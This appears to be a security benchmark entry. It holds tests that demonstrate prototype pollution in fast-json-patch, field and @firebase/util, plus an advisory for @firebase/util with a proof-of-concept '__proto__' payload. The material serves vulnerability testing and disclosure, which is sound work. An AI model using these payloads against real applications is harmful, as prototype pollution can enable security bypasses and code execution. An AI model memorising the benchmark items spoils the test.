secbench_test:
//https://github.com/Starcounter-Jack/JSON-Patch/issues/216
test("prototype pollution in fast-json-patch", () => {
  let fp = require("fast-json-patch");
  const patch = [{ op: "replace", path: "/__proto__/polluted", value: "yes" }];

  expect({}.polluted).toBe(undefined);

  fp.applyPatch({}, patch);
  expect({}.polluted).toBe("yes");
});

//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
test("prototype pollution in field ", () => {
  expect({}.polluted).toBe(undefined);

  const field = require("field");
  const obj = {};
  field.set(obj, "__proto__.polluted", "yes");

  expect(obj.polluted).toBe("yes");
});

//https://hackerone.com/reports/1001218
test("prototype pollution in @firebase/util", () => {
  expect({}.polluted).toBe(undefined);

  const utils = require("@firebase/util");
  const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  utils.deepExtend({}, source);

  expect({}.polluted).toBe("yes");
});

advisory_descriptions:
@firebase/utilis a wrapper of some Webchannel Features for the Firebase JS SDK.Affected versions of this package are vulnerable to Prototype Pollution. This vulnerability relates to thedeepExtendfunction within theDeepCopy.tsfile. Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program.const util = require('@firebase/util');
var payload = JSON.parse('{"__proto__": {"polluted": "vulnerable"}}');const a = {
    nest: {
      number: 1,
      string: '1',
      object: { key: '1' },
      date: new Date(1),
      nest: {
        a: 1
      }
    },
  };var result = util.deepExtend(a,payload);
